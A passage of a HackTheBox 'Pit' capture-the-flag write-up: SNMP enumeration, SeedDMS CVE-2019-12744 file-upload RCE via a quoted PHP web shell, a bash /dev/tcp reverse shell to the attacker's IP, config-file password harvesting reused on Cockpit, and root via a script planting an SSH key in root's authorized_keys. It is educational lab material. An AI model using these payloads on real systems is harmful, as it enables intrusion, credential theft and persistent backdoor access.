</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.18 <span class=o>=</span> STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.19 <span class=o>=</span> STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.20 <span class=o>=</span> STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.21 <span class=o>=</span> STRING: user_u          user       s0         s0                             user_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.22 <span class=o>=</span> STRING: xguest_u        user       s0         s0                             xguest_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.23 <span class=o>=</span> STRING: login
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.24 <span class=o>=</span> STRING: 
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.25 <span class=o>=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.26 <span class=o>=</span> STRING: 
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.27 <span class=o>=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.28 <span class=o>=</span> STRING: michelle             user_u               s0                   *
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.29 <span class=o>=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.30 <span class=o>=</span> STRING: System uptime
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.31 <span class=o>=</span> STRING:  14:03:52 up 12:03,  <span class=m>0</span> users,  load average: 0.04, 0.01, 0.00
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.31 <span class=o>=</span> No more variables left in this MIB View <span class=o>(</span>It is past the end of the MIB tree<span class=o>)</span>
</span></span></code></pre></div><p>I will also notice that some of the output lines starting with <code>NET-SNMP-EXTEND-MIB</code> are similar to the output from some Linux command utilities such as <code>uptime</code> and <code>free -h</code>.</p><h3 id=seeddms-tcp-80>SeedDMS (TCP 80)<a class=anchor aria-hidden=true href=#seeddms-tcp-80>#</a></h3><p>From the enumeration above, a web directory was revealed at <code>/var/www/html/seeddms51x/seeddms</code> by <code>snmpwalk</code>. Since the directory path contains a &ldquo;dms&rdquo; string, I tried to append the path name to <code>http://dms-pit.htb</code>.</p><p>And then when I enter <code>http://dms-pit.htb/seeddms51x/seeddms</code>, it redirects me to a login page.</p><p><div class=img-container><img src=imgs/image-20210521014642036.png alt=image-20210521014642036></div></p><p>A quick search for &ldquo;SeedDMS&rdquo; on Google pops <a href="https://www.seeddms.org/index.php?id=2">this link</a>. It states that SeedDMS is:</p><blockquote><p>A free document management system with an easy to use web based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.</p></blockquote><h4 id=gobuster>Gobuster<a class=anchor aria-hidden=true href=#gobuster>#</a></h4><p>This time <code>gobuster</code> reveals some accessible items.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t <span class=m>10</span> -b 403,404 -r
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://dms-pit.htb/seeddms51x/seeddms/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   403,404
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              txt,php
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Follow Redirect:         <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/05/20 15:13:54 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7359<span class=o>]</span>
</span></span><span class=line><span class=cl>/CHANGELOG            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 101652<span class=o>]</span>
</span></span><span class=line><span class=cl>/LICENSE              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 18321<span class=o>]</span>
</span></span><span class=line><span class=cl>/TODO                 <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2844<span class=o>]</span>
</span></span><span class=line><span class=cl>/Guests.php           <span class=o>(</span>Status: 502<span class=o>)</span> <span class=o>[</span>Size: 173<span class=o>]</span>
</span></span><span class=line><span class=cl>/GuideImages.php      <span class=o>(</span>Status: 502<span class=o>)</span> <span class=o>[</span>Size: 173<span class=o>]</span>
</span></span><span class=line><span class=cl>/HB.php               <span class=o>(</span>Status: 502<span class=o>)</span> <span class=o>[</span>Size: 173<span class=o>]</span>
</span></span><span class=line><span class=cl>/HDRS.php             <span class=o>(</span>Status: 502<span class=o>)</span> <span class=o>[</span>Size: 173<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/05/20 15:22:45 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>Poking <code>/CHANGELOG</code> with curl reveals the software version.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG  <span class=p>|</span> head 
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>                     Changes in version 5.1.15
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>- Improved import from file system
</span></span><span class=line><span class=cl>- HTTP Proxy <span class=k>for</span> access on external extension repository can be <span class=nb>set</span>
</span></span><span class=line><span class=cl>- Do not use unzip in ExtensionMgr anymore
</span></span><span class=line><span class=cl>- fix version compare on info page
</span></span><span class=line><span class=cl>- allow one page mode on search page
</span></span><span class=line><span class=cl>- fix import of older extension versions from repository
</span></span></code></pre></div><h4 id=searchsploit-1>Searchsploit<a class=anchor aria-hidden=true href=#searchsploit-1>#</a></h4><p>I feed the version to <code>searchsploit</code>, and it returns with some potential exploits. There is one for RCE.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ searchsploit seeddms
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                             <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>SeedDMS 5.1.18 - Persistent Cross-Site Scripting                           <span class=p>|</span> php/webapps/48324.txt
</span></span><span class=line><span class=cl>SeedDMS &lt; 5.1.11 - <span class=s1>&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                 <span class=p>|</span> php/webapps/47024.txt
</span></span><span class=line><span class=cl>SeedDMS &lt; 5.1.11 - <span class=s1>&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                   <span class=p>|</span> php/webapps/47023.txt
</span></span><span class=line><span class=cl>SeedDMS versions &lt; 5.1.11 - Remote Command Execution                       <span class=p>|</span> php/webapps/47022.txt
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>The exploitation steps for the RCE vulnerability is as follow:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
</span></span></span><span class=line><span class=cl><span class=err># Google Dork: [NA]
</span></span></span><span class=line><span class=cl><span class=err># Date: [20-June-2019]
</span></span></span><span class=line><span class=cl><span class=err># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
</span></span></span><span class=line><span class=cl><span class=err># Vendor Homepage: [https://www.seeddms.org]
</span></span></span><span class=line><span class=cl><span class=err># Software Link: [https://sourceforge.net/projects/seeddms/files/]
</span></span></span><span class=line><span class=cl><span class=err># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
</span></span></span><span class=line><span class=cl><span class=err># Tested on: [NA]
</span></span></span><span class=line><span class=cl><span class=err># CVE : [CVE-2019-12744]
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>Exploit Steps:
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>Step 1: Login to the application and under any folder add a document.
</span></span></span><span class=line><span class=cl><span class=err>Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>PHP Backdoor Code: 
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>if(isset($_REQUEST[&#39;cmd&#39;])){
</span></span></span><span class=line><span class=cl><span class=err>        echo &#34;&lt;pre&gt;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>        $cmd = ($_REQUEST[&#39;cmd&#39;]);
</span></span></span><span class=line><span class=cl><span class=err>        system($cmd);
</span></span></span><span class=line><span class=cl><span class=err>        echo &#34;&lt;/pre&gt;&#34;;
</span></span></span><span class=line><span class=cl><span class=err>        die;
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>Step 3: Now after uploading the file check the document id corresponding to the document.
</span></span></span><span class=line><span class=cl><span class=err>Step 4: Now go to example.com/data/1048576/&#34;document_id&#34;/1.php?cmd=cat+/etc/passwd to get the command response in browser.
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>Note: Here &#34;data&#34; and &#34;1048576&#34; are default folders where the uploaded files are getting saved.
</span></span></span></code></pre></div><p>I will need a valid credentials for RCE.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-nginx>Shell as nginx<a class=anchor aria-hidden=true href=#shell-as-nginx>#</a></h3><h4 id=seeddms-dashboard>SeedDMS Dashboard<a class=anchor aria-hidden=true href=#seeddms-dashboard>#</a></h4><p><code>admin:admin</code> are the default credentials for SeedDMS.</p><p><div class=img-container><img src=imgs/image-20210521014957029.png alt=image-20210521014957029></div></p><p>But these creds didn&rsquo;t work here, so I submit <code>michelle:michelle</code>, and it logs me in 😮 !</p><p><div class=img-container><img src=imgs/image-20210521023728548.png alt=image-20210521023728548></div></p><h4 id=seeddms-cve-2019-12744>SeedDMS CVE-2019-12744<a class=anchor aria-hidden=true href=#seeddms-cve-2019-12744>#</a></h4><p>With a valid account, I can try to reproduce the exploitation steps for remote code execution.</p><p>First, I will create a document by navigating to <code>Docs > Users > Michelle</code> (folders), and then under <code>michelle</code> folder I will add a new document.</p><p><div class=img-container><img src=imgs/image-20210521025006867.png alt=image-20210521025006867></div></p><p>On the local file menu, I will browse and upload my PHP web shell.</p><p><div class=img-container><img src=imgs/image-20210521025924716.png alt=image-20210521025924716></div></p><p>And the file gets uploaded.</p><p><div class=img-container><img src=imgs/image-20210521030038234.png alt=image-20210521030038234></div></p><p>According to the exploit author, the uploaded web shell should be available at <code>http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id</code>, where <code>63</code> is my document ID, but I couldn&rsquo;t find it there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ curl -s <span class=s1>&#39;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id&#39;</span>
</span></span><span class=line><span class=cl>File not found.
</span></span></code></pre></div><p>The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on <code>http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id</code>!</p><p><div class=img-container><img src=imgs/image-20210521031346742.png alt=image-20210521031346742></div></p><h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>I will send a bash reverse shell to get a foothold on the box.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>/bin/bash -c <span class=s2>&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>On my listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.49»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.49<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.241<span class=o>]</span> <span class=m>58888</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>26319<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>bash-4.4$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>992<span class=o>(</span>nginx<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>988<span class=o>(</span>nginx<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>988<span class=o>(</span>nginx<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>system_u:system_r:httpd_t:s0
</span></span></code></pre></div><p>>> I just read and watched other writeups, and they were unable to get a foothold. Not sure why, but I did.</p><p><div class=img-container><img src=imgs/image-20210521034126889.png alt=image-20210521034126889></div></p><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-michelle>Shell as michelle<a class=anchor aria-hidden=true href=#shell-as-michelle>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Searching for string &ldquo;pass&rdquo; under <code>/var/www/html/seeddms51x/conf</code> reveals the database credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-4.4$ <span class=nb>pwd</span>
</span></span><span class=line><span class=cl><span class=nb>pwd</span>
</span></span><span class=line><span class=cl>/var/www/html/seeddms51x/conf
</span></span><span class=line><span class=cl>bash-4.4$  grep -Ri <span class=s2>&#34;pass&#34;</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>settings.xml:    &lt;database <span class=nv>dbDriver</span><span class=o>=</span><span class=s2>&#34;mysql&#34;</span> <span class=nv>dbHostname</span><span class=o>=</span><span class=s2>&#34;localhost&#34;</span> <span class=nv>dbDatabase</span><span class=o>=</span><span class=s2>&#34;seeddms&#34;</span> <span class=nv>dbUser</span><span class=o>=</span><span class=s2>&#34;seeddms&#34;</span> <span class=nv>dbPass</span><span class=o>=</span><span class=s2>&#34;ied^ieY6xoquu&#34;</span> <span class=nv>doNotCheckVersion</span><span class=o>=</span><span class=s2>&#34;false&#34;</span>&gt;
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>Under <code>/var/www/html/seeddms51x/data/conf</code> there is also another database credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-4.4$ <span class=nb>pwd</span>
</span></span><span class=line><span class=cl><span class=nb>pwd</span>
</span></span><span class=line><span class=cl>/var/www/html/seeddms51x/data/conf
</span></span><span class=line><span class=cl>bash-4.4$ grep -Ri pass
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>settings.xml:    &lt;database <span class=nv>dbDriver</span><span class=o>=</span><span class=s2>&#34;sqlite&#34;</span> <span class=nv>dbHostname</span><span class=o>=</span><span class=s2>&#34;localhost&#34;</span> <span class=nv>dbDatabase</span><span class=o>=</span><span class=s2>&#34;/home/www-data/seeddms51x/data/content.db&#34;</span> <span class=nv>dbUser</span><span class=o>=</span><span class=s2>&#34;seeddms&#34;</span> <span class=nv>dbPass</span><span class=o>=</span><span class=s2>&#34;seeddms&#34;</span> <span class=nv>doNotCheckVersion</span><span class=o>=</span><span class=s2>&#34;false&#34;</span>&gt;
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>The password <code>ied^ieY6xoquu</code> is the one that valid, but I didn&rsquo;t find anything juicy in the database.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>bash-4.4$ mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class=s1>&#39;show databases;&#39;</span>
</span></span><span class=line><span class=cl>mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class=s1>&#39;show databases;&#39;</span>
</span></span><span class=line><span class=cl>Database
</span></span><span class=line><span class=cl>information_schema
</span></span><span class=line><span class=cl>seeddms
</span></span></code></pre></div><h4 id=cockpit-tcp-9090>Cockpit (TCP 9090)<a class=anchor aria-hidden=true href=#cockpit-tcp-9090>#</a></h4><p>Using <code>Michelle:ied^ieY6xoquu</code> on the Cockpit login page at <code>https://pit.htb:9090</code> logs me in.</p><p><div class=img-container><img src=imgs/image-20210521063658472.png alt=image-20210521063658472></div></p><p>Cockpit gives terminal access through its web interface to interact with the system. I couldn&rsquo;t get my reverse shell/SSH to work because of SELinux, so I will just use this terminal and grab the user flag.</p><p><div class=img-container><img src=imgs/image-20210521064953236.png alt=image-20210521064953236></div></p><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>For the SNMP enumeration, I will remember <code>/usr/bin/monitoring</code>, which turned out to be a bash script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span>michelle@pit /<span class=o>]</span>$ cat /usr/bin/monitor
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> script in /usr/local/monitoring/check*sh
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl>    /bin/bash <span class=nv>$script</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></div><p>The script takes and executes other scripts under <code>/usr/local/monitoring/</code> which filename begins with <code>check</code> and ends with <code>sh</code> . If I try to list the content of that directory, it returns a permission denied error.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span>michelle@pit /<span class=o>]</span>$ ls -l /usr/local/monitoring/
</span></span><span class=line><span class=cl>ls: cannot open directory <span class=s1>&#39;/usr/local/monitoring/&#39;</span>: Permission denied
</span></span></code></pre></div><p>But with <code>-ld</code>, it shows that the folder has extended permission, and user <code>michelle</code> is allowed to write a file under that directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span>michelle@pit /<span class=o>]</span>$ ls -ld /usr/local/monitoring/
</span></span><span class=line><span class=cl>drwxrwx---+ <span class=m>2</span> root root <span class=m>122</span> May <span class=m>20</span> 20:35 /usr/local/monitoring/
</span></span><span class=line><span class=cl><span class=o>[</span>michelle@pit /<span class=o>]</span>$ getfacl /usr/local/monitoring/
</span></span><span class=line><span class=cl>getfacl: Removing leading <span class=s1>&#39;/&#39;</span> from absolute path names
</span></span><span class=line><span class=cl><span class=c1># file: usr/local/monitoring/</span>
</span></span><span class=line><span class=cl><span class=c1># owner: root</span>
</span></span><span class=line><span class=cl><span class=c1># group: root</span>
</span></span><span class=line><span class=cl>user::rwx
</span></span><span class=line><span class=cl>user:michelle:-wx
</span></span><span class=line><span class=cl>group::rwx
</span></span><span class=line><span class=cl>mask::rwx
</span></span><span class=line><span class=cl>other::---
</span></span></code></pre></div><h4 id=from-snmp-to-rce>From SNMP to RCE<a class=anchor aria-hidden=true href=#from-snmp-to-rce>#</a></h4><p>From the SNMP enumeration, each time an SNMP &ldquo;walk&rdquo; is performed, <code>usr/bin/monitor</code> will always pop up in the <code>NET-SNMP-EXTEND-MIB</code> section.</p><p><div class=img-container><img src=imgs/image-20210521075856288.png alt=image-20210521075856288></div></p><p>Based on the output above, and the following <a href=https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending>documentation</a>, there is a chance that when a SNMP walk is performed, the Net-SNMP agent will also execute <code>/usr/bin/monitor</code>.</p><p><div class=img-container><img src=imgs/image-20211013161852076.png alt=image-20211013161852076></div></p><p>So, the strategy here is that I can try to write a script and save it under <code>/usr/local/monitoring/</code>. Then I will do a SNMP walk to trigger the Net-SNMP agent to execute <code>/usr/bin/monitor</code> which will then eventually execute the script I created.</p><p>Now I will write a script to <code>/usr/local/monitoring/</code> that will inject my SSH public key to the root&rsquo;s authorized_keys file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span>michelle@pit /<span class=o>]</span>$ <span class=nb>echo</span> -e <span class=s1>&#39;#!/bin/bash\nmkdir -p /root/.ssh/ 2&gt;/dev/null &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#34; &gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_iamf.sh
</span></span></code></pre></div><p>Then I will do another SNMP walk and wait for it to finish, or at least get to the NET-SNMP-EXTEND-MIB output line.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ snmpwalk -v 2c -c public 10.10.10.241 internet
</span></span></code></pre></div><p>And now if I try to SSH login as root to Pit, it logs me in.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ ssh root@10.10.10.241
</span></span><span class=line><span class=cl>Web console: https://pit.htb:9090/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Thu May <span class=m>20</span> 21:12:44 <span class=m>2021</span> from 10.10.14.49
</span></span><span class=line><span class=cl><span class=o>[</span>root@pit ~<span class=o>]</span><span class=c1># id</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span><span class=line><span class=cl><span class=o>[</span>root@pit ~<span class=o>]</span><span class=c1># ls -l</span>
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>-rwx------. <span class=m>1</span> root root <span class=m>706</span> Apr <span class=m>22</span>  <span class=m>2020</span> cleanup.sh
</span></span><span class=line><span class=cl>drwx------. <span class=m>2</span> root root <span class=m>122</span> Apr <span class=m>18</span>  <span class=m>2020</span> monitoring
</span></span><span class=line><span class=cl>lrwxrwxrwx. <span class=m>1</span> root root   <span class=m>9</span> May <span class=m>10</span> 11:07 null -&gt; /dev/null
</span></span><span class=line><span class=cl>-r--------. <span class=m>1</span> root root  <span class=m>33</span> May <span class=m>20</span> 02:00 root.txt
</span></span><span class=line><span class=cl><span class=o>[</span>root@pit ~<span class=o>]</span><span class=c1>#</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210521081359037.png alt=image-20210521081359037></div></p><blockquote><p>Phew, I didn&rsquo;t expect this writeup to be this long. 😅🔨</p></blockquote><div class=post-references><h2>References</h2><ul><li><a href=https://book.hacktricks.xyz/pentesting/pentesting-snmp target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-snmp</a></li><li><a href=https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#snmp---udp-161 target=_blank rel="noopener noreferrer">https://0xdf.gitlab.io/2019/01/05/htb-mischief.html#snmp---udp-161</a></li><li><a href=https://www.alvestrand.no/objectid/1.3.6.1.html target=_blank rel="noopener noreferrer">https://www.alvestrand.no/objectid/1.3.6.1.html</a></li><li><a href=https://oidref.com/1.3.6.1 target=_blank rel="noopener noreferrer">https://oidref.com/1.3.6.1</a></li><li><a href=http://www.linux-admins.net/2012/02/linux-snmp-oids-for-cpumemory-and-disk.html target=_blank rel="noopener noreferrer">http://www.linux-admins.net/2012/02/linux-snmp-oids-for-cpumemory-and-disk.html</a></li><li><a href=http://www.oidview.com/mibs/2021/UCD-SNMP-MIB.html target=_blank rel="noopener noreferrer">http://www.oidview.com/mibs/2021/UCD-SNMP-MIB.html</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/snmp/>SNMP</a></li><li><a href=https://fahmifj.github.io/tags/seeddms/>SeedDMS</a></li><li><a href=https://fahmifj.github.io/tags/cve-2019-12744/>CVE-2019-12744</a></li><li><a href=https://fahmifj.github.io/tags/cockpit/>Cockpit</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Pit on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Pit&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f&hashtags=Linux%2cSNMP%2cSeedDMS%2cCVE-2019-12744%2cCockpit"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 